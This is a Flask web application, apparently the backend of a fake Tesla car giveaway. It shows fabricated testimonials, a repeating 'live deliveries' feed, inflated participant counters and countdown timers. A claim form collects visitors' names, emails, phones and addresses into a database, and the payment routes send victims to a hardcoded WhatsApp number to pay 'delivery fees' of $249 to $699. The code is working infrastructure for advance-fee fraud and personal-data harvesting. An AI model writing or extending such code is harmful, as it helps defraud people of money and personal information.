import os
import json
from functools import wraps
from urllib.parse import quote

from dotenv import load_dotenv
from flask import Flask, render_template, request, redirect, url_for, flash, session, current_app, jsonify
from werkzeug.security import check_password_hash, generate_password_hash

from db import get_db, close_db

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", "change-this-secret")

app.config["MYSQL_HOST"] = os.getenv("MYSQL_HOST", "localhost")
app.config["MYSQL_USER"] = os.getenv("MYSQL_USER", "root")
app.config["MYSQL_PASSWORD"] = os.getenv("MYSQL_PASSWORD", "")
app.config["MYSQL_DATABASE"] = os.getenv("MYSQL_DATABASE", "tesla_giveaway")
app.config["ADMIN_WHATSAPP"] = os.getenv("ADMIN_WHATSAPP", "+14046150478")

app.teardown_appcontext(close_db)

CAR_MODELS = [
    {
        "name": "Tesla Model 3",
        "type": "Standard Range",
        "range": "358 mi range",
        "hp": "510 hp Dual Motor",
        "badge": "Most Popular",
        "fee": "$289",
        "delivery": "5–7 business days",
        "image": "images/model3.jpg",
    },
    {
        "name": "Tesla Model Y",
        "type": "Premium SUV",
        "range": "330 mi range",
        "hp": "384 hp Electric",
        "badge": "Express Delivery",
        "fee": "$319",
        "delivery": "6–8 business days",
        "image": "images/modely.jpg",
    },
    {
        "name": "Tesla Model S",
        "type": "Luxury Flagship",
        "range": "405 mi range",
        "hp": "670 hp Tri Motor",
        "badge": "Premium",
        "fee": "$399",
        "delivery": "5–7 business days",
        "image": "images/models.jpg",
    },
    {
        "name": "Tesla Model X",
        "type": "Luxury SUV",
        "range": "348 mi range",
        "hp": "670 hp Tri Motor",
        "badge": "Best Value",
        "fee": "$349",
        "delivery": "10–14 business days",
        "image": "images/modelx.jpg",
    },
    {
        "name": "Tesla Cybertruck",
        "type": "Electric Pickup",
        "range": "340 mi range",
        "hp": "845 hp AWD",
        "badge": "New Arrival",
        "fee": "$459",
        "delivery": "7–10 business days",
        "image": "images/cybertruck2.jpg",
    },
    {
        "name": "Tesla Roadster",
        "type": "Sports Coupe",
        "range": "620 mi range",
        "hp": "1,000+ hp",
        "badge": "Performance",
        "fee": "$599",
        "delivery": "8–12 business days",
        "image": "images/roadster.jpg",
    },
    {
        "name": "Tesla Model 3 SR",
        "type": "Standard Range Plus",
        "range": "272 mi range",
        "hp": "283 hp RWD",
        "badge": "Budget Pick",
        "fee": "$249",
        "delivery": "5–6 business days",
        "image": "images/model3sr.jpg",
    },
    {
        "name": "Tesla Model Y LR",
        "type": "Long Range SUV",
        "range": "330 mi range",
        "hp": "384 hp Dual Motor",
        "badge": "Long Range",
        "fee": "$379",
        "delivery": "6–9 business days",
        "image": "images/modelylr.jpg",
    },
    {
        "name": "Tesla Model S Plaid",
        "type": "Ultra Performance",
        "range": "396 mi range",
        "hp": "1,020 hp Plaid",
        "badge": "Fastest",
        "fee": "$699",
        "delivery": "9–14 business days",
        "image": "images/modelsplaid.jpg",
    },
]

LIVE_DELIVERIES = [
    {"name": "Emma W.", "country": "Canada", "model": "Tesla Model Y 2025", "status": "Vehicle en route 🚗", "price": "$319", "time": "46 min ago"},
    {"name": "Sophie M.", "country": "UK", "model": "Tesla Model Y 2024", "status": "Car dispatched 🚚", "price": "$349", "time": "58 min ago"},
    {"name": "Fatima A.", "country": "UAE", "model": "Tesla Model 3 2025", "status": "Car dispatched 🚚", "price": "$399", "time": "28 min ago"},
    {"name": "Jin W.", "country": "South Korea", "model": "Tesla Model 3 2025", "status": "Car dispatched 🚚", "price": "$329", "time": "49 min ago"},
    {"name": "James O.", "country": "USA", "model": "Tesla Model 3 2024", "status": "Delivery confirmed ✓", "price": "$319", "time": "57 min ago"},
    {"name": "Yuki T.", "country": "Japan", "model": "Tesla Model X 2024", "status": "Shipment confirmed ✓", "price": "$399", "time": "58 min ago"},
    {"name": "Yuki T.", "country": "Japan", "model": "Tesla Model X 2024", "status": "Shipment confirmed ✓", "price": "$299", "time": "11 min ago"},
    {"name": "Sophie M.", "country": "UK", "model": "Tesla Model Y 2024", "status": "Car dispatched 🚚", "price": "$249", "time": "1 min ago"},
    {"name": "Sophie M.", "country": "UK", "model": "Tesla Model Y 2024", "status": "Car dispatched 🚚", "price": "$349", "time": "10 min ago"},
    {"name": "Yuki T.", "country": "Japan", "model": "Tesla Model X 2024", "status": "Shipment confirmed ✓", "price": "$349", "time": "39 min ago"},
]

TESTIMONIES = [
    {"name": "Mike Johnson", "country": "USA", "time": "2 days ago", "text": "Just received my Tesla Model 3 2024!! I paid the delivery fee and within 9 days the car was at my door."},
    {"name": "Sarah Williams", "country": "UK", "time": "1 day ago", "text": "I received my Tesla Model Y 2025 after paying the delivery fee. It was delivered right to my address."},
    {"name": "Carlos Mendez", "country": "Mexico", "time": "3 days ago", "text": "From Mexico! I received my Tesla Model 3 2024 after confirming my delivery details."},
    {"name": "Priya Sharma", "country": "India", "time": "5 hours ago", "text": "From India, I got my Tesla Model Y 2025 after the payment chat on WhatsApp."},
    {"name": "James Okafor", "country": "Nigeria", "time": "12 hours ago", "text": "Nigeria represent! Tesla Model 3 delivered to my doorstep."},
    {"name": "Emma Brown", "country": "Canada", "time": "just now", "text": "Tesla delivery confirmed and the process was smooth."},
    {"name": "Aisha Bello", "country": "Ghana", "time": "just now", "text": "My delivery details were verified through WhatsApp quickly."},
]

def get_setting(key, default=""):
    db = get_db()
    cur = db.cursor(dictionary=True)
    cur.execute("SELECT setting_value FROM site_settings WHERE setting_key=%s", (key,))
    row = cur.fetchone()
    cur.close()
    return row["setting_value"] if row else default

def whatsapp_link(message):
    number = get_setting("whatsapp_number", current_app.config["ADMIN_WHATSAPP"])
    app.config["ADMIN_WHATSAPP"] = "+14046150478"
    return f"https://wa.me/{number}?text={quote(message)}"

def login_required(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        if not session.get("admin_id"):
            return redirect(url_for("admin_login"))
        return view(*args, **kwargs)
    return wrapped

@app.context_processor
def inject_globals():
    return {
        "site_name": get_setting("site_name", "Tesla Motors"),
        "hero_joined_count": get_setting("hero_joined_count", "12,907"),
        "event_live_count": get_setting("event_live_count", "12,919"),
    }

def load_comments():
    comments_path = os.path.join(app.static_folder, "data", "comments.json")
    if not os.path.exists(comments_path):
        return []
    if os.path.getsize(comments_path) == 0:
        return []
    try:
        with open(comments_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except json.JSONDecodeError:
        return []

@app.route("/")
def giveaway():
    event_ends = {
        "hrs": "12",
        "min": "30",
        "sec": "45"
    }
    return render_template(
        "giveaway.html",
        live_count=get_setting("hero_joined_count", "12,907"),
        cars=CAR_MODELS,
        comments=load_comments(),
        testimonials=TESTIMONIES,
        deliveries=LIVE_DELIVERIES,
        participants=5400,
        event_ends=event_ends,
    )

@app.route("/info")
def info():
    return render_template(
        "info.html",
        live_count=get_setting("event_live_count", "12,919"),
        cars=CAR_MODELS,
    )

@app.route("/instruction")
def instruction():
    return render_template("instruction.html")

@app.route("/participate")
def participate():
    return render_template(
        "participate.html",
        event_ends={"hrs": "11", "min": "42", "sec": "33"},
        participants="12,847",
        cars=CAR_MODELS,
    )

@app.route("/transactions")
def transactions():
    return render_template("transactions.html", deliveries=LIVE_DELIVERIES)

@app.route("/pay/<plan>")
def pay(plan):
    name = request.args.get("name", "Customer")
    amount = request.args.get("amount", "0")
    message = f"Hello Admin, my name is {name}. I want to make payment for {plan}. Amount: {amount}."
    return redirect(whatsapp_link(message))

@app.route("/claim", methods=["GET", "POST"])
def claim():
    if request.method == "POST":
        # 1. Capture data from form
        model = request.form.get("model")
        name = request.form.get("name")
        email = request.form.get("email")
        phone = request.form.get("phone")
        country = request.form.get("country")
        city = request.form.get("city")
        zip_postal = request.form.get("zip_postal")
        promo_code = request.form.get("promo_code", "").strip()
        address = request.form.get("address")

        if not promo_code:
            flash("Promo code is required.", "error")
            return render_template("claim.html", cars=CAR_MODELS)

        # 2. Save to MySQL database
        db = get_db()
        cur = db.cursor()
        cur.execute("""
            INSERT INTO claims (model_name, full_name, email, phone, country, city, zip_postal, promo_code, address)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
        """, (model, name, email, phone, country, city, zip_postal, promo_code, address))
        db.commit()
        cur.close()

        # 3. Store in session for the order summary page
        session["claim_data"] = {
            "model": model,
            "name": name,
            "email": email,
            "phone": phone,
            "country": country,
            "city": city,
            "zip_postal": zip_postal,
            "promo_code": promo_code,
            "address": address,
        }
        
        return redirect(url_for("order_summary"))

    return render_template("claim.html", cars=CAR_MODELS)


@app.route("/order-summary", methods=["GET", "POST"])
def order_summary():
    data = session.get("claim_data")
    if not data:
        return redirect(url_for("claim"))

    selected_model = next(
        (car for car in CAR_MODELS if car["name"] == data["model"]),
        CAR_MODELS[0]
    )

    if request.method == "POST":
        delivery = request.form.get("delivery_option", "standard")
        session["delivery_option"] = delivery
        return redirect(url_for("pay_delivery"))

    return render_template("order_summary.html", data=data, car=selected_model)

# @app.route("/pay-delivery", methods=["GET", "POST"])
# def pay_delivery():
#     data = session.get("claim_data")
#     if not data:
#         return redirect(url_for("claim"))

#     delivery = session.get("delivery_option", "standard")
#     delivery_map = {
#         "standard": {"fee": 299, "eta": "10–14 business days"},
#         "express": {"fee": 349, "eta": "5–7 business days"},
#         "premium": {"fee": 399, "eta": "3–5 business days"},
#     }

#     selected_model = next(
#         (car for car in CAR_MODELS if car["name"] == data["model"]),
#         CAR_MODELS[0]
#     )

#     if request.method == "POST":
#         payment_method = request.form.get("payment_method")
#         session["payment_method"] = payment_method
#         return redirect(url_for("success_page"))

#     return render_template(
#         "pay_delivery.html",
#         data=data,
#         car=selected_model,
#         delivery=delivery_map.get(delivery, delivery_map["standard"])
#     )

@app.route("/pay-delivery")
def pay_delivery():
    data = session.get("claim_data")
    if not data:
        return redirect(url_for("claim"))

    delivery = session.get("delivery_option", "standard")
    delivery_map = {
        "standard": {"fee": 299, "eta": "10–14 business days"},
        "express": {"fee": 349, "eta": "5–7 business days"},
        "premium": {"fee": 399, "eta": "3–5 business days"},
    }

    selected_model = next(
        (car for car in CAR_MODELS if car["name"] == data["model"]),
        CAR_MODELS[0]
    )
    delivery_info = delivery_map.get(delivery, delivery_map["standard"])

    message = (
        f"Hello Admin, I want to pay for delivery.\n"
        f"Name: {data['name']}\n"
        f"Email: {data['email']}\n"
        f"Phone: {data['phone']}\n"
        f"Address: {data['address']}\n"
        f"Car: {selected_model['name']} 2025\n"
        f"Delivery Fee: ${delivery_info['fee']}\n"
        f"ETA: {delivery_info['eta']}"
    )

    chat = request.args.get("chat", "whatsapp").lower()

    if chat == "telegram":
        telegram_username = current_app.config.get("TELEGRAM_USERNAME", "YourTelegramUsername")
        return redirect(f"https://t.me/{telegram_username}")

    return redirect(whatsapp_link(message))


def whatsapp_link(message):
    number = get_setting("whatsapp_number", current_app.config["ADMIN_WHATSAPP"])
    return f"https://wa.me/{number}?text={quote(message)}"

# @app.route("/success")
# def success_page():
#     return render_template("success.html")


# @app.route("/success")
# def success_page():
#     data = session.get("claim_data")
#     delivery = session.get("delivery_option", "standard")
#     selected_model = next((car for car in CAR_MODELS if car["name"] == data["model"]), CAR_MODELS[0]) if data else None
#     return render_template("success.html", data=data, car=selected_model, delivery=delivery)

@app.route("/success")
def success_page():
    data = session.get("claim_data")
    delivery = session.get("delivery_option", "standard")
    selected_model = next((car for car in CAR_MODELS if car["name"] == data["model"]), CAR_MODELS[0]) if data else None
    return render_template("success.html", data=data, car=selected_model, delivery=delivery)



@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        db = get_db()
        cur = db.cursor(dictionary=True)
        cur.execute("SELECT * FROM admins WHERE email=%s", (email,))
        admin = cur.fetchone()
        cur.close()
        if admin and check_password_hash(admin["password_hash"], password):
            session["admin_id"] = admin["id"]
            return redirect(url_for("admin_dashboard"))
        flash("Invalid credentials.", "error")
    return render_template("admin/login.html")

# @app.route("/admin")
# @login_required
# def admin_dashboard():
#     db = get_db()
#     cur = db.cursor(dictionary=True)
    
#     # 1. Get stats
#     cur.execute("SELECT COUNT(*) AS total FROM claims")
#     claims_count = cur.fetchone()["total"]
    
#     cur.execute("SELECT COUNT(*) AS total FROM testimonials")
#     testimonials_count = cur.fetchone()["total"]
    
#     cur.execute("SELECT COUNT(*) AS total FROM payments")
#     payments_count = cur.fetchone()["total"]
    
#     # 2. Get recent claims including phone and promo_code
#     # Ensure these column names (phone, promo_code, model_name) 
#     # match the names exactly as they are in your database
#     cur.execute("""
#         SELECT full_name, phone, promo_code, model_name, created_at 
#         FROM claims 
#         ORDER BY id DESC LIMIT 10
#     """)
#     recent_claims = cur.fetchall()
    
#     cur.close()
    
#     return render_template(
#         "admin/dashboard.html", 
#         claims=claims_count, 
#         testimonials=testimonials_count, 
#         payments=payments_count,
#         recent_claims=recent_claims
#     )

@app.route("/admin/settings", methods=["GET", "POST"])
@login_required
def admin_settings():
    if request.method == "POST":
        # Add your settings update logic here
        flash("Settings updated.", "success")
        return redirect(url_for("admin_settings"))
    return render_template("admin/settings.html")

@app.route("/admin/logout")
def admin_logout():
    session.clear()
    return redirect(url_for("admin_login"))



# @app.route("/admin/payments")
# @login_required
# def admin_payments():
#     db = get_db()
#     cur = db.cursor(dictionary=True)
#     # Ensure this query matches your database table structure
#     cur.execute("""
#         SELECT p.id, p.amount, p.method, p.payment_status, p.created_at, c.name, c.model 
#         FROM payments p
#         LEFT JOIN claims c ON c.id = p.claim_id
#         ORDER BY p.id DESC
#     """)
#     payments = cur.fetchall()
#     cur.close()
#     return render_template("admin/payments.html", payments=payments)




@app.route("/admin/testimonials", methods=["GET", "POST"])
@login_required
def admin_testimonials():
    db = get_db()
    cur = db.cursor(dictionary=True)
    cur.execute("SELECT * FROM testimonials ORDER BY id DESC")
    testimonials = cur.fetchall()
    cur.close()
    return render_template("admin/testimonials.html", testimonials=testimonials)

@app.route("/admin/payments")
@login_required
def admin_payments():
    db = get_db()
    cur = db.cursor(dictionary=True)
    cur.execute("SELECT * FROM payments ORDER BY id DESC")
    payments = cur.fetchall()
    cur.close()
    return render_template("admin/payments.html", payments=payments)

@app.route("/admin/tutorials")
@login_required
def admin_tutorials():
    return render_template("admin/tutorials.html")


# @app.route("/admin/dashboard")
# @login_required
# def admin_dashboard():
#     db = get_db()
#     cur = db.cursor(dictionary=True)
    
#     # Query to fetch the recent claims, including the model_name
#     cur.execute("SELECT id, full_name, model_name, created_at FROM claims ORDER BY id DESC LIMIT 10")
#     recent_claims = cur.fetchall()
    
#     cur.close()
    
#     # Pass 'recent_claims' to your dashboard template
#     return render_template("admin/dashboard.html", recent_claims=recent_claims)

# @app.route("/admin/login", methods=["GET", "POST"])
# def admin_login():
#     if request.method == "POST":
#         email = request.form.get("email")
#         password = request.form.get("password")
#         db = get_db()
#         cur = db.cursor(dictionary=True)
#         cur.execute("SELECT * FROM admins WHERE email=%s", (email,))
#         admin = cur.fetchone()
#         cur.close()

#         if admin and check_password_hash(admin["password_hash"], password):
#             session["admin_id"] = admin["id"]
#             session["admin_name"] = admin["full_name"]
#             return redirect(url_for("admin_dashboard"))

#         flash("Invalid admin credentials.", "error")

#     return render_template("admin/login.html")

# @app.route("/admin/logout")
# def admin_logout():
#     session.clear()
#     return redirect(url_for("admin_login"))

# @app.route("/admin")
# @login_required
# def admin_dashboard():
#     db = get_db()
#     cur = db.cursor(dictionary=True)
    
#     # Get stats
#     cur.execute("SELECT COUNT(*) AS total FROM claims")
#     claims_count = cur.fetchone()["total"]
    
#     cur.execute("SELECT COUNT(*) AS total FROM testimonials")
#     testimonials_count = cur.fetchone()["total"]
    
#     cur.execute("SELECT COUNT(*) AS total FROM payments")
#     payments_count = cur.fetchone()["total"]
    
#     # Get recent claims (to show promo codes and user info)
#     cur.execute("SELECT * FROM claims ORDER BY id DESC LIMIT 10")
#     recent_claims = cur.fetchall()
    
#     cur.close()
#     return render_template(
#         "admin/dashboard.html", 
#         claims=claims_count, 
#         testimonials=testimonials_count, 
#         payments=payments_count,
#         recent_claims=recent_claims
#     )@app.route("/admin")


# @login_required
# def admin_dashboard():
#     db = get_db()
#     cur = db.cursor(dictionary=True)
    
#     # Get stats
#     cur.execute("SELECT COUNT(*) AS total FROM claims")
#     claims_count = cur.fetchone()["total"]
    
#     cur.execute("SELECT COUNT(*) AS total FROM testimonials")
#     testimonials_count = cur.fetchone()["total"]
    
#     cur.execute("SELECT COUNT(*) AS total FROM payments")
#     payments_count = cur.fetchone()["total"]
    
#     # Get recent claims (to show promo codes and user info)
#     cur.execute("SELECT * FROM claims ORDER BY id DESC LIMIT 10")
#     recent_claims = cur.fetchall()
    
#     cur.close()
#     return render_template(
#         "admin/dashboard.html", 
#         claims=claims_count, 
#         testimonials=testimonials_count, 
#         payments=payments_count,
#         recent_claims=recent_claims
#     )

# @app.route("/admin/settings", methods=["GET", "POST"])
# @login_required
# def admin_settings():
#     if request.method == "POST":
#         items = {
#             "site_name": request.form.get("site_name", "Tesla Motors"),
#             "whatsapp_number": request.form.get("whatsapp_number", "2348012345678"),
#             "hero_joined_count": request.form.get("hero_joined_count", "12,907"),
#             "event_live_count": request.form.get("event_live_count", "12,919"),
#             "delivery_fee_note": request.form.get("delivery_fee_note", "Covers shipping, customs & logistics"),
#         }
#         db = get_db()
#         cur = db.cursor()
#         for k, v in items.items():
#             cur.execute("""
#                 INSERT INTO site_settings (setting_key, setting_value)
#                 VALUES (%s, %s)
#                 ON DUPLICATE KEY UPDATE setting_value=VALUES(setting_value)
#             """, (k, v))
#         db.commit()
#         cur.close()
#         flash("Settings updated successfully.", "success")
#         return redirect(url_for("admin_settings"))

#     return render_template("admin/settings.html")

# @app.route("/admin/testimonials", methods=["GET", "POST"])
# @login_required
# def admin_testimonials():
#     db = get_db()
#     if request.method == "POST":
#         name = request.form.get("name")
#         country = request.form.get("country")
#         time_text = request.form.get("time_text")
#         comment = request.form.get("comment")
#         cur = db.cursor()
#         cur.execute(
#             "INSERT INTO testimonials (name, country, time_text, comment) VALUES (%s, %s, %s, %s)",
#             (name, country, time_text, comment),
#         )
#         db.commit()
#         cur.close()
#         flash("Testimonial added.", "success")
#         return redirect(url_for("admin_testimonials"))

#     cur = db.cursor(dictionary=True)
#     cur.execute("SELECT * FROM testimonials ORDER BY id DESC")
#     testimonials = cur.fetchall()
#     cur.close()
#     return render_template("admin/testimonials.html", testimonials=testimonials)

# @app.route("/admin/payments")
# @login_required
# def admin_payments():
#     db = get_db()
#     cur = db.cursor(dictionary=True)
#     cur.execute("""
#         SELECT p.id, p.amount, p.method, p.payment_status, p.created_at, c.full_name, c.model_name
#         FROM payments p
#         LEFT JOIN claims c ON c.id = p.claim_id
#         ORDER BY p.id DESC
#     """)
#     payments = cur.fetchall()
#     cur.close()
#     return render_template("admin/payments.html", payments=payments)

# @app.route("/admin/tutorials")
# @login_required
# def admin_tutorials():
#     return render_template("admin/tutorials.html")

# @app.route("/admin/add-admin", methods=["POST"])
# @login_required
# def add_admin():
#     full_name = request.form.get("full_name")
#     email = request.form.get("email")
#     password = request.form.get("password")
#     db = get_db()
#     cur = db.cursor()
#     cur.execute(
#         "INSERT INTO admins (email, password_hash, full_name) VALUES (%s, %s, %s)",
#         (email, generate_password_hash(password), full_name),
#     )
#     db.commit()
#     cur.close()
#     flash("Admin added successfully.", "success")
#     return redirect(url_for("admin_dashboard"))


@app.route("/admin")
@login_required
def admin_dashboard():
    db = get_db()
    cur = db.cursor(dictionary=True)
    
    # 1. Fetch statistics
    cur.execute("SELECT COUNT(*) AS total FROM claims")
    claims_count = cur.fetchone()["total"]
    
    cur.execute("SELECT COUNT(*) AS total FROM testimonials")
    testimonials_count = cur.fetchone()["total"]
    
    cur.execute("SELECT COUNT(*) AS total FROM payments")
    payments_count = cur.fetchone()["total"]
    
    # 2. Fetch the 10 most recent claims
    # Ensure these column names match your MySQL table schema exactly
    cur.execute("""
        SELECT full_name, email, model_name, phone, country, promo_code, created_at 
        FROM claims 
        ORDER BY id DESC LIMIT 10
    """)
    recent_claims = cur.fetchall()
    
    cur.close()
    
    return render_template(
        "admin/dashboard.html", 
        claims=claims_count, 
        testimonials=testimonials_count, 
        payments=payments_count,
        recent_claims=recent_claims
    )



@app.route("/api/comments")
def get_comments():
    # Generate 50 comments on the fly
    all_comments = []
    for i in range(1, 51):
        all_comments.append({
            "id": i,
            "initials": f"U{i}",
            "name": f"User {i}",
            "time": f"{i} mins ago",
            "text": f"This is comment number {i}, and it is working perfectly!",
            "likes": str(i * 10),
            "pinned": False
        })
    
    page = int(request.args.get("page", 1))
    per_page = 20
    start = (page - 1) * per_page
    
    return jsonify(all_comments[start : start + per_page])

    # def ensure_comments_exist():
    #     path = "static/data/comments.json"
    # if not os.path.exists(path) or os.path.getsize(path) == 0:
    #     os.makedirs("static/data", exist_ok=True)
    #     # This is a sample list to ensure the file is NOT empty
    #     sample_comments = [{"id": 1, "initials": "JD", "name": "John Doe", "time": "1 min ago", "text": "This is a test comment!", "likes": "10", "pinned": True}]
    #     with open(path, "w", encoding="utf-8") as f:
    #         json.dump(sample_comments, f)
    #     print("Created comments file automatically.")

# Call this once when the app starts
    ensure_comments_exist()
if __name__ == "__main__":
    app.run(debug=True)
